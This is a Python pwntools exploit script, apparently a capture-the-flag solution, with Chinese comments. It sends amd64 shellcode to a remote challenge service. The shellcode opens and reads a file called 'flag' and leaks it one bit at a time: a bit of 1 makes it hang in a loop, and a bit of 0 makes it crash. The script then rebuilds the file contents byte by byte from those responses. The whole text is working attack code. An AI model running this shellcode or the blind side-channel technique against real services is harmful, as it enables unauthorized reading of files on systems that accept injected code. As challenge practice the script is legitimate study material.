from pwn import *
import sys

context.arch = 'amd64'
context.log_level='error'
TARGET_IP = 'node11.anna.nssctf.cn'  # 替换为题目实际IP
TARGET_PORT = 23829          # 替换为题目实际端口
TIMEOUT = 2                  # 超时时间，根据网络延迟调整

def check_bit(offset, bit, retry=3):
    for _ in range(retry):
        try:
            # 生成检查特定位的shellcode
            shellcode = asm(f'''
                lea rdi, [rip+flag];
                xor rsi, rsi;   // O_RDONLY
                mov rax, 2;
                syscall;         // open("flag", O_RDONLY)

                cmp rax, 0;
                jl exit;        // 处理open失败

                mov rdi, rax;    // 文件描述符
                sub rsp, 0x100;  // 分配栈空间
                mov rsi, rsp;    // 读取到栈缓冲区
                mov rdx, 0x100;  // 读取长度
                xor rax, rax;    // sys_read
                syscall;

                mov al, byte ptr [rsi+{offset}];
                shr al, {bit};
                and al, 1;
                test al, al;
                jz exit;         // 如果位为0，触发崩溃

            loop:
                jmp loop;        // 死循环，位为1

            exit:
                ud2;            // 非法指令导致崩溃

            flag:
                .string "flag";
            ''')

            p = remote(TARGET_IP, TARGET_PORT)
            #p=process("./shellcode")

            p.recvuntil("Please input your shellcode: \n")
            p.send(shellcode)
            try:
                p.recv(timeout=TIMEOUT)
                # 超时未异常，说明位为1
                return 1
            except EOFError:
                # 出现EOF，说明位为0
                return 0
            finally:
                p.close()
        except Exception as e:
            # 连接问题，重试
            continue
    return 0  # 重试后失败，默认返回0

def brute_flag():
    flag = []
    offset = 0
    
    while True:
        byte = 0
        for bit in range(7, -1, -1):  # 从高位到低位检查
            if check_bit(offset, bit):
                byte |= (1 << bit)
        flag.append(byte)
        print(f"[+] Offset {offset}: {chr(byte) if 32 <= byte < 127 else ' '} (0x{byte:02x})")
        
        if byte == 0 or byte == ord('}'):
            break
        offset += 1

    # 将字节列表转换为字符串，去除可能的空字符
    flag_str = bytes(flag).split(b'\x00')[0].decode('latin-1', errors='ignore')
    return flag_str

if __name__ == "__main__":
    flag = brute_flag()
    print("\n[+] Flag:", flag)
